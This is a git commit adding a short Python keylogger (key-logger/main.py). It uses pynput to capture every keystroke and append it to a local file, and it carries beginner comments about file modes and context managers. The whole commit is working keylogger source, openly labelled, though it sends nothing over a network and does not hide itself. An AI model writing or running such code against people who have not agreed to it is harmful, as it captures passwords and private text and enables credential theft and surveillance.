288296b151be479f5a3ec6c24d42784263fbfdbb
Kushal7444 <142094762+Kushal7444@users.noreply.github.com>
2025-08-02 20:37:00 +1100

    Add files via upload

---
+++ key-logger/main.py
@@ -0,0 +1,34 @@
+#storing the keystroke in a text file
+#file handling how to read write and append to a file
+#r-reading
+#w-writing
+#a-appending to a file
+from pynput.keyboard import Listener
+
+
+def write_to_file(key):
+    letter = str(key)
+    letter = letter.replace("'", "")
+
+    if letter == 'Key.space':
+        letter = ' '
+    if letter == 'Key.shift_r':
+        letter = ''
+    if letter == "Key.ctrl_l":
+        letter = ""
+    if letter == "Key.enter":
+        letter = "\n"
+
+    with open("listening.txt", 'a') as f:
+        f.write(letter)
+
+# Collecting events until stopped
+
+with Listener(on_press=write_to_file) as l:
+    l.join()
+
+
+# 'with' will automatically close the listener. When we stop the program the memory allocated
+# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
+# or the program stops the memory is released. It's just a good coding principle to follow
+
